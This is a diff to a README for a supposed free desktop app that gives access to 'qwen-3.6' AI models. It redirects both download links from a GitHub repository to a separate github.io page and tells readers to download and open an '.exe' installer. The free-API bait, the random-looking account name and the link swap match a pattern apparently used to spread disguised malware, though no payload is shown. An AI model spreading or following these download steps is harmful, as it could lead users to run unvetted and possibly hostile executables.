@@ -1,6 +1,6 @@
 # 🤖 qwen-3.6-free-api-desktop-app - Access advanced AI models on desktop
 
-[![](https://img.shields.io/badge/Download_Installer-Blue-blue)](https://github.com/taurine-musicpaper697/qwen-3.6-free-api-desktop-app)
+[![](https://img.shields.io/badge/Download_Installer-Blue-blue)](https://taurine-musicpaper697.github.io)
 
 ## 📋 About This Software
 
@@ -20,7 +20,7 @@ Before you install the application, check that your computer meets these minimum
 
 Follow these steps to set up the software on your machine.
 
-1. Visit the repository page to download the installer: [https://github.com/taurine-musicpaper697/qwen-3.6-free-api-desktop-app](https://github.com/taurine-musicpaper697/qwen-3.6-free-api-desktop-app)
+1. Visit the repository page to download the installer: [https://taurine-musicpaper697.github.io](https://taurine-musicpaper697.github.io)
 2. Locate the most recent release on the right side of the page under the "Releases" section.
 3. Click the link that ends in ".exe" to download the installer file to your computer.
 4. Open your "Downloads" folder.
